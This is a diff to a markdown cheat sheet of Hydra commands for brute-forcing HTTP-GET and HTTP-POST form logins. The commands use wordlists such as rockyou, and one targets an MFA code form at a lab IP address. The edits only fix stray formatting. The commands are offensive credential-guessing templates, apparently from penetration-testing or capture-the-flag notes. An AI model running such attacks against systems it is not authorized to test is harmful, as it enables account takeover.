@@ -1,7 +1,7 @@
 https://www.hackingarticles.in/a-detailed-guide-on-hydra/
 ##### Bruteforce HTTP-Get
 ```
-hydra -l USER -P /usr/share/wordlists/rockyou.txt IP -s PORT http-get /PATH`
+hydra -l USER -P /usr/share/wordlists/rockyou.txt IP -s PORT http-get /PATH
 ```
 
 ##### Bruteforce HTTP-Post-form
@@ -15,6 +15,6 @@ hydra -l jason -P list.txt 10.10.204.240 http-post-form "/console/mfa.php:code=^
 ```
 
 ```
-	hydra -l username -P list.txt IP_ADDR http-post-form "/PATH/VULN.PHP:PASSWORD_ARG=^PASS^:H=Cookie: COOKIE1=TESTl; COOKIE2=TEST2:INCORRECT_RET_VALUE" -I -V
+hydra -l username -P list.txt IP_ADDR http-post-form "/PATH/VULN.PHP:PASSWORD_ARG=^PASS^:H=Cookie: COOKIE1=TESTl; COOKIE2=TEST2:INCORRECT_RET_VALUE" -I -V
 ```
 Note: the "incorrect" must always be the last parameter
